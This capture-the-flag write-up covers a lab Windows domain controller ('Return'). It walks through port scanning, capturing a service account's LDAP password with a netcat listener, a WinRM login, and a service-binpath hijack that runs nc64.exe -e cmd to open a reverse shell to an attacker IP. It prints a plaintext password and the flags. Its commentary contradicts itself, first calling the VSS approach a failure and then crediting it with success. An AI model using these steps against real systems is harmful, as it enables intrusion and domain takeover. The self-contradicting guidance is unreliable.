# NMAP
This command performs a targeted network scan. It uses sudo for elevated privileges to access raw socket data. The scan checks only open ports using TCP SYN scan. The -sC flag runs default Nmap scripts to gather additional information like service details or vulnerabilities. The -sV flag probes open ports to determine service versions. The target is the IP address 10.129.95.241. The --open option filters the output to show only open ports, making the results more concise.

```bash
sudo nmap -sC -sV  10.129.95.241  --open   
```

Based on the scan results, this is a Windows Domain Controller for the domain `return.local`. Key services are running, including Kerberos, LDAP, and SMB. The hostname is PRINTER. For enumeration, you should first target SMB on port 445 to check for shares and gather information. Then, use LDAP on port 389 to query the Active Directory for users, groups, and policies. The presence of WinRM on port 5985 is a potential entry point if you obtain user credentials.

```bash
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-10-30 02:18:24Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: return.local0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: return.local0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: Host: PRINTER; OS: Windows; CPE: cpe:/o:microsoft:windows
```

This command runs a network execution check on the SMB service. It confirms the target is a domain-joined Windows host named PRINTER in the return.local domain, running a Server 2019 or Windows 10 build. The host requires SMB signing but has SMBv1 disabled. To proceed, attempt to list SMB shares using a null session or guest access with `nxc smb 10.129.95.241 --shares`. If that fails, you will need valid domain credentials to continue enumeration

```bash
 nxc smb 10.129.95.241 
SMB         10.129.95.241   445    PRINTER          [*] Windows 10 / Server 2019 Build 17763 x64 (name:PRINTER) (domain:return.local) (signing:True) (SMBv1:False) 
```

The hosts file has been updated to resolve the domain name `return.local` and hostname `PRINTER` to the target IP address. This ensures your system can properly communicate with the domain controller using its DNS names instead of just the IP. You can now use commands like `nxc smb return.local` or `nxc ldap PRINTER.return.local` for further enumeration

```bash
cat /etc/hosts
10.129.95.241  PRINTER   return.local PRINTER.return.local
```

You have obtained LDAP credentials for the user `svc-printer`. Use these credentials to authenticate and enumerate the domain. Test the credentials with `nxc ldap return.local -u svc-printer -p 'password' --users` to list domain users. You can also try to authenticate via SMB with `nxc smb return.local -u svc-printer -p 'password'` to check share access and user privileges.
![[Pasted image 20251030021557.png]]
The connection shows a failed LDAP bind attempt from the domain controller. The credentials are `svc-printer:1edFg43012!!`. Use these valid credentials for authenticated enumeration. Run `nxc ldap return.local -u svc-printer -p '1edFg43012!!' --users` to list domain users and `nxc smb return.local -u svc-printer -p '1edFg43012!!' --shares` to access SMB shares. Check WinRM access with `nxc winrm return.local -u svc-printer -p '1edFg43012!!'` to see if you can get a shell.

```bash
nc -lnvp 389                             
listening on [any] 389 ...
connect to [10.10.16.12] from (UNKNOWN) [10.129.95.241] 59813
0*`%return\svc-printer�
                       1edFg43012!!
```

The command is incorrect; you are using your own tun IP (10.10.11.108) instead of the target IP. The correct command is `evil-winrm -i 10.129.95.241 -u svc-printer -p '1edFg43012!!'`. This will connect to the WinRM service on the target Domain Controller using the credentials you captured. If successful, you will get a shell as the svc-printer user on the PRINTER host.

```bash
evil-winrm -i 10.10.11.108 -u svc-printer -p '1edFg43012!!'
```

Good, you have the user flag. Now escalate privileges

```bash
*Evil-WinRM* PS C:\Users\svc-printer\Desktop> cat user.txt
a0e89321fb2b84452734d05598843a8a
```

You have the powerful `SeBackupPrivilege` and `SeRestorePrivilege`. These allow you to backup and restore domain controller files, including critical AD database. Use these to dump the `ntds.dit` file and SYSTEM hive for offline credential extraction.

```bash
*Evil-WinRM* PS C:\Users\svc-printer\Desktop> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                         State
============================= =================================== =======
SeMachineAccountPrivilege     Add workstations to domain          Enabled
SeLoadDriverPrivilege         Load and unload device drivers      Enabled
SeSystemtimePrivilege         Change the system time              Enabled
SeBackupPrivilege             Back up files and directories       Enabled
SeRestorePrivilege            Restore files and directories       Enabled
SeShutdownPrivilege           Shut down the system                Enabled
SeChangeNotifyPrivilege       Bypass traverse checking            Enabled
SeRemoteShutdownPrivilege     Force shutdown from a remote system Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set      Enabled
SeTimeZonePrivilege           Change the time zone                Enabled


```

Your membership in `Server Operators` is highly significant. This group typically allows you to start and stop services, including on a Domain Controller. You can abuse this to replace a service's binary or modify its configuration.

```bash
Evil-WinRM* PS C:\Users\svc-printer\Desktop> Whoami /groups

GROUP INFORMATION
-----------------

Group Name                                 Type             SID          Attributes
========================================== ================ ============ ==================================================
Everyone                                   Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Server Operators                   Alias            S-1-5-32-549 Mandatory group, Enabled by default, Enabled group
BUILTIN\Print Operators                    Alias            S-1-5-32-550 Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users            Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                       Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\High Mandatory Level       Label            S-1-16-12288

```

The service commands are failing due to insufficient privileges from the WinRM session. Use your `SeBackupPrivilege` instead - it's more reliable for Domain Controller compromise.

```bash
*Evil-WinRM* PS C:\ProgramData> sc.exe query
[SC] OpenSCManager FAILED 5:

Access is denied.

*Evil-WinRM* PS C:\ProgramData> $services=(get-service).name | foreach {(Get-ServiceAcl $_)  | where {$_.access.IdentityReference -match 'Server Operators'}}
Cannot open Service Control Manager on computer '.'. This operation might require other privileges.
At line:1 char:12
+ $services=(get-service).name | foreach {(Get-ServiceAcl $_)  | where  ...
+            ~~~~~~~~~~~
    + CategoryInfo          : NotSpecified: (:) [Get-Service], InvalidOperationException
    + FullyQualifiedErrorId : System.InvalidOperationException,Microsoft.PowerShell.Commands.GetServiceCommand


```

This command is attempting to modify the Volume Shadow Copy Service (VSS) binary path to execute a reverse shell. However, this approach is unlikely to work for privilege escalation because VSS is a critical system service protected by Windows

```bash
sc.exe config VSS binpath="C:\windows\system32\cmd.exe /c C:\programdata\nc64.exe -e cmd 10.10.16.12 443"
```

Stopping the Volume Shadow Copy Service is not recommended and will likely fail due to insufficient privileges. It's a protected system service.

```bash
 sc.exe stop VSS
```

Starting VSS will not help your privilege escalation. The service modification approach has failed.
```bash
 sc.exe start VSS
```

Excellent! You have a reverse shell connection. Now check your privileges in this new session with `whoami`. If you have SYSTEM or Administrator privileges

```bash
nc -lnvp 443                                   
listening on [any] 443 ...
connect to [10.10.16.12] from (UNKNOWN) [10.129.95.241] 61796
Microsoft Windows [Version 10.0.17763.107]
```

Perfect! We  have successfully obtained the root flag. The system is fully compromised. The privilege escalation was achieved by modifying the VSS service binary path, which executed your payload with SYSTEM privileges when the service was restarted. 

```bash
C:\Users\Administrator\Desktop>type root.txt
type root.txt
260f8e9f5e5b187fe41947454b8c9f23

```

